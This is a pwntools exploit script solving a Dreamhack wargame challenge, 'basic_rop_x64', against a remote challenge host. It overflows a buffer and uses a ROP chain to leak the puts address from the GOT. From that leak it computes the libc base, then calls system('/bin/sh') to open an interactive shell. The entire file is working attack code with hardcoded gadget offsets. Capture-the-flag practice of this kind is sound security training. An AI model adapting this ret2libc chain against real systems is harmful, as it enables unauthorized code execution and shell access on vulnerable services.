from os import lseek
from pwn import *

def slog(n,m):
    return success(":".join([n,hex(m)]))

# [0] settings
p = remote("host3.dreamhack.games", 11632)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
r = ROP(e)
context.arch = 'amd64'
context.log_level = 'debug'


# [1] Get informations
# address
puts_plt = 0x4005c6     # puts@plt+6
puts_got = 0x601018
main_symbol = 0x4007ba

# lib <=> main offset
# main_offset = libc.symbols["main"]
slog("main@library", main_symbol)
# lib <-> puts offset
put_symbol = libc.symbols["puts"]
slog("puts@library", put_symbol)

# code gadget
pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
ret = 0x4005a9


# [2] Leak 
payload = b"A"*0x48 
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(main_symbol)

p.send(payload)

p.recvuntil("A"*0x40)

put_leak =  u64(p.recvn(6)+b"\x00"*2)
slog("put_leak", put_leak)

lib_base = put_leak - put_symbol
slog("lib_base", lib_base)

#p.interactive()  # can go to main!

# get system address
system = lib_base + libc.symbols["system"]
slog("system address",system)
bin_sh = lib_base + list(libc.search("/bin/sh"))[0]  # remember this!!

# [3] ROP and get SHELL
payload2 = b"A"*0x48
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(system)

p.send(payload2)

p.interactive()